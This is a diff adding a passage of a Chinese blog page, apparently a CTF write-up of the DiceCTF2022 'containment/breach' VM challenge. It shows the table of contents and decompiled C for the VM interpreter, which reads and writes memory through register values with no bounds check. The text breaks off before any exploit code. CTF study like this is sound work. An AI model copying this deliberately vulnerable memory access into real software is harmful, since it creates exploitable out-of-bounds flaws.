@@ -1,0 +1,2057 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">DiceCTF2022-containment/breach - Niebelungen</title><meta name="Description" content="Niebelungen"><meta property="og:title" content="DiceCTF2022-containment/breach" />
+<meta property="og:description" content="DiceCTF2022-containment/breach一个不一样的虚拟机。一个简单的虚拟机的二进制文件通过利用它来 &ldquo;突破 &" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/dicectf2022-containment-breach/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-07T10:23:52+08:00" />
+<meta property="article:modified_time" content="2022-03-07T10:23:52+08:00" /><meta property="og:site_name" content="Niebelungen" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="DiceCTF2022-containment/breach"/>
+<meta name="twitter:description" content="DiceCTF2022-containment/breach一个不一样的虚拟机。一个简单的虚拟机的二进制文件通过利用它来 &ldquo;突破 &"/>
+<meta name="application-name" content="Niebelungen">
+<meta name="apple-mobile-web-app-title" content="Niebelungen">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/favicon.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://example.org/dicectf2022-containment-breach/" /><link rel="prev" href="http://example.org/dicectf2022/" /><link rel="next" href="http://example.org/d-3ctf2022-d3bpf/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DiceCTF2022-containment/breach",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/dicectf2022-containment-breach\/"
+        },"genre": "posts","keywords": "Writeups","wordcount":  6056 ,
+        "url": "http:\/\/example.org\/dicectf2022-containment-breach\/","datePublished": "2022-03-07T10:23:52+08:00","dateModified": "2022-03-07T10:23:52+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Niebelungen"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme);}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Niebelungen">Niebelungen</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Niebelungen">Niebelungen</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="#" onclick="return false;" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#程序分析">程序分析</a></li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#指令分析">指令分析</a></li>
+        <li><a href="#vuln">Vuln</a></li>
+        <li><a href="#exp">Exp</a></li>
+      </ul>
+    </li>
+    <li><a href="#rev">Rev</a>
+      <ul>
+        <li><a href="#指令分析-1">指令分析</a></li>
+        <li><a href="#patch_cmd">patch_cmd</a></li>
+        <li><a href="#z3-slover">z3-slover</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DiceCTF2022-containment/breach</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Niebelungen</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/writeups/"><i class="far fa-folder fa-fw"></i>Writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-03-07">2022-03-07</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-03-07">2022-03-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 6056 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 13 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#程序分析">程序分析</a></li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#指令分析">指令分析</a></li>
+        <li><a href="#vuln">Vuln</a></li>
+        <li><a href="#exp">Exp</a></li>
+      </ul>
+    </li>
+    <li><a href="#rev">Rev</a>
+      <ul>
+        <li><a href="#指令分析-1">指令分析</a></li>
+        <li><a href="#patch_cmd">patch_cmd</a></li>
+        <li><a href="#z3-slover">z3-slover</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="dicectf2022-containmentbreach" class="headerLink">
+    <a href="#dicectf2022-containmentbreach" class="header-mark"></a>DiceCTF2022-containment/breach</h1><p>一个不一样的虚拟机。一个简单的虚拟机的二进制文件通过利用它来 &ldquo;突破 &ldquo;虚拟机，安装新的指令处理程序来进行flag检查。</p>
+<p>a binary for a simple VM &ldquo;breaks out&rdquo; of the VM by exploiting it and installs new instruction handlers to do flag checking.</p>
+<h2 id="程序分析" class="headerLink">
+    <a href="#%e7%a8%8b%e5%ba%8f%e5%88%86%e6%9e%90" class="header-mark"></a>程序分析</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">next_pc</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">opclass</span><span class="p">;</span> <span class="c1">// [rsp-59h] [rbp-61h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">reg_idx</span><span class="p">;</span> <span class="c1">// [rsp-4Dh] [rbp-55h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">tmp_val</span><span class="p">;</span> <span class="c1">// [rsp-48h] [rbp-50h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">FILE</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span> <span class="c1">// [rsp-40h] [rbp-48h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp-38h] [rbp-40h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">dst_reg</span><span class="p">;</span> <span class="c1">// [rsp-20h] [rbp-28h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">src_reg</span><span class="p">;</span> <span class="c1">// [rsp-18h] [rbp-20h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Usage: %s program.bin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">argv</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="n">ftell</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">code</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fread</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="o">!</span><span class="n">exited</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">opclass</span> <span class="o">=</span> <span class="n">code</span><span class="p">[</span><span class="n">pc</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">opclass</span> <span class="o">&gt;</span> <span class="mh">0xAu</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Unknown instruction: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">opclass</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span> <span class="n">opclass</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">0u</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exited</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">++</span><span class="n">pc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">1u</span><span class="o">:</span>                                  <span class="c1">// mov reg, imm
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Reg_list</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pc</span> <span class="o">+=</span> <span class="mi">9LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">2u</span><span class="o">:</span>                                  <span class="c1">// mov reg, reg
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Reg_list</span><span class="p">[</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">]</span> <span class="o">=</span> <span class="n">Reg_list</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pc</span> <span class="o">+=</span> <span class="mi">2LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">3u</span><span class="o">:</span>                                  <span class="c1">// alu dst, src
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">reg_idx</span> <span class="o">=</span> <span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dst_reg</span> <span class="o">=</span> <span class="n">Reg_list</span><span class="p">[</span><span class="n">reg_idx</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">src_reg</span> <span class="o">=</span> <span class="n">Reg_list</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">7u</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">switch</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">              <span class="n">tmp_val</span> <span class="o">=</span> <span class="n">dst_reg</span> <span class="o">+</span> <span class="n">src_reg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">              <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">              <span class="n">tmp_val</span> <span class="o">=</span> <span class="n">dst_reg</span> <span class="o">-</span> <span class="n">src_reg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">              <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">              <span class="n">tmp_val</span> <span class="o">=</span> <span class="n">src_reg</span> <span class="o">*</span> <span class="n">dst_reg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">              <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">              <span class="n">tmp_val</span> <span class="o">=</span> <span class="n">dst_reg</span> <span class="o">%</span> <span class="n">src_reg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">              <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">              <span class="n">tmp_val</span> <span class="o">=</span> <span class="n">src_reg</span> <span class="o">&amp;</span> <span class="n">dst_reg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">              <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">              <span class="n">tmp_val</span> <span class="o">=</span> <span class="n">src_reg</span> <span class="o">|</span> <span class="n">dst_reg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">              <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">6</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">              <span class="n">tmp_val</span> <span class="o">=</span> <span class="n">src_reg</span> <span class="o">^</span> <span class="n">dst_reg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">              <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">7</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">              <span class="n">tmp_val</span> <span class="o">=</span> <span class="n">dst_reg</span> <span class="o">&gt;&gt;</span> <span class="n">src_reg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">              <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Reg_list</span><span class="p">[</span><span class="n">reg_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp_val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pc</span> <span class="o">+=</span> <span class="mi">2LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">4u</span><span class="o">:</span>                                  <span class="c1">// mov ds:[reg], reg
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">*</span><span class="p">(</span><span class="kr">__int64</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">data_seg</span> <span class="o">+</span> <span class="n">Reg_list</span><span class="p">[</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">])</span> <span class="o">=</span> <span class="n">Reg_list</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pc</span> <span class="o">+=</span> <span class="mi">2LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">5u</span><span class="o">:</span>                                  <span class="c1">// mov reg, ds:[reg]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Reg_list</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kr">__int64</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">data_seg</span> <span class="o">+</span> <span class="n">Reg_list</span><span class="p">[</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pc</span> <span class="o">+=</span> <span class="mi">2LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">6u</span><span class="o">:</span>                                  <span class="c1">// mov reg, cs:[reg]
